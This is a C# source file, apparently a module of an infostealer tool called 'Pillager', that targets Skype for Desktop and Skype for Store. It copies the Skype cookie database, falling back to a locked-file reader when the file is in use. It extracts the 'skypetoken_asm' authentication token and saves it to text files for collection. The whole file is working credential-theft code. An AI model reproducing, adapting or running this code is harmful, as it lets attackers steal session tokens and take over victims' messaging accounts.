using Pillager.Helper;
using System;
using System.IO;
using System.Text;

namespace Pillager.Messengers
{
    internal class Skype : ICommand
    {
        public string[] MessengerPaths = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Skype for Desktop"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store")
        };

        public string Skype_cookies(string MessengerPath)
        {
            StringBuilder cookies = new StringBuilder();
            string skype_cookies_path = Path.Combine(MessengerPath, "Network\\Cookies");
            if (!File.Exists(skype_cookies_path)) return null;
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                try
                {
                    File.Copy(skype_cookies_path, cookie_tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(skype_cookies_path);
                    if (ckfile != null) File.WriteAllBytes(cookie_tempFile, ckfile);
                }
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string host_key = handler.GetValue(i, "host_key");
                    string name = handler.GetValue(i, "name");
                    string crypt = handler.GetValue(i, "value");
                    if (handler.GetValue(i, "name") == "skypetoken_asm")
                        cookies.AppendLine("{skypetoken}={" + handler.GetValue(i, "value") + "}");
                }
                File.Delete(cookie_tempFile);
            }
            catch { }
            return cookies.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                if (!Directory.Exists(MessengerPaths[0]) && !Directory.Exists(MessengerPaths[1])) return;
                string Desktop = Skype_cookies(MessengerPaths[0]);
                string Store = Skype_cookies(MessengerPaths[1]);
                if (string.IsNullOrEmpty(Desktop) && string.IsNullOrEmpty(Store)) return;
                string savepath = Path.Combine(path, "Skype");
                Directory.CreateDirectory(savepath);
                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, "Skype_Desktop.txt"), Desktop, Encoding.UTF8);
                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, "Skype_Store.txt"), Store, Encoding.UTF8);
            }
            catch { }
        }
    }
}
